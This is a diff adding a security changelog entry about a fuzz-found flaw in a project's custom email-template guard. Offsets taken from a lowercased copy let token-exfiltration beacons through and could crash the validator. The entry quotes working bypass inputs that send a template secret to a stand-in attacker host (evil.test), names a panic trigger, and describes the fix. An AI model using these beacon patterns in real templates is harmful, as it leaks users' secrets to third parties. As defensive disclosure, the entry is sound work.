@@ -7,6 +7,47 @@ had drifted far enough that nobody could tell which of six upgrades was the hard
 
 ### Security
 
+* **The email template guard accepted three exfiltration beacons and could be made to
+  panic.** `CR-30` records that the guard is written for this codebase rather than taken
+  from a library, and its residual risk read: *"a gap in it is a gap nobody else is
+  fuzzing."* 1.0.3 acted on that sentence. The first fuzz target ever pointed at the guard
+  found three accepted beacons and an unrecovered panic, the first of them within a second.
+
+  All four were one mistake, in the step deciding where a link starts. It searched a
+  lowercased copy of the rendered document and then sliced the *original* at the offsets it
+  found, and `strings.ToLower` is neither length-preserving nor class-preserving. Invalid
+  UTF-8 grows by two bytes per byte and some valid runes grow too, so the examined window
+  slid off the run it was meant to read -- and far enough along, off the end of the string:
+  22 leading `U+023A` ahead of a beacon panicked the validator outright, in code that runs
+  on admin write and again on every load of a stored override. Folding also moves bytes
+  between classes: `U+0130` folds to ASCII `i`, so a byte that is not a host byte in the
+  document is one in the copy, and the word-boundary test read the wrong answer.
+
+  Separately, the lookahead after a protocol-relative `//` was taken from the *masked*
+  document, where a secret is a placeholder rather than a host byte. So
+  `//{{.Token}}@evil.test/` was accepted and `//x{{.Token}}@evil.test/` refused: one literal
+  byte was the entire difference. `//{{.Token}}.evil.test/` was accepted too, and that one
+  leaks on DNS resolution alone.
+
+  The search now runs on the document's own bytes, folding one prefix at a time, and a
+  masked secret counts as a host byte. Reaching any of this needs a `super_admin` writing an
+  email template, which is the population that could rewrite the mail wholesale anyway --
+  the point is not an escalation but that the control did not do what the register said it
+  did.
+
+  `FuzzGuardTemplate` stays, asserting an invariant rather than a verdict: if the guard
+  accepts, then in both branding states no value a mail client resolves as a URL and no
+  auto-linkifiable text run carries a live secret to a host the operator did not choose. Its
+  oracle re-renders with its own unmasked secrets and finds URL sites with its own
+  tokeniser, so it inherits no miss from the code it is judging, and it exempts only a URL
+  whose authority is the configured host -- which makes it a lower bound on the guard, and a
+  failure therefore always a leak rather than a policy difference.
+
+  The same mistake was looked for everywhere else it could live. Of the 37 `strings.ToLower`
+  calls in `internal/` and `cmd/`, every other one feeds a containment, prefix or equality
+  test; none takes an index from the folded copy and slices the original. The class is
+  confined to the site fixed here.
+
 * **A federated access token asserted an authentication nobody performed.** The OAuth
   callback issued its token pair with `NewAuthContext(time.Now(), ...)`, so `auth_time` on
   a federated token dated the login to the moment the callback ran. An identity provider
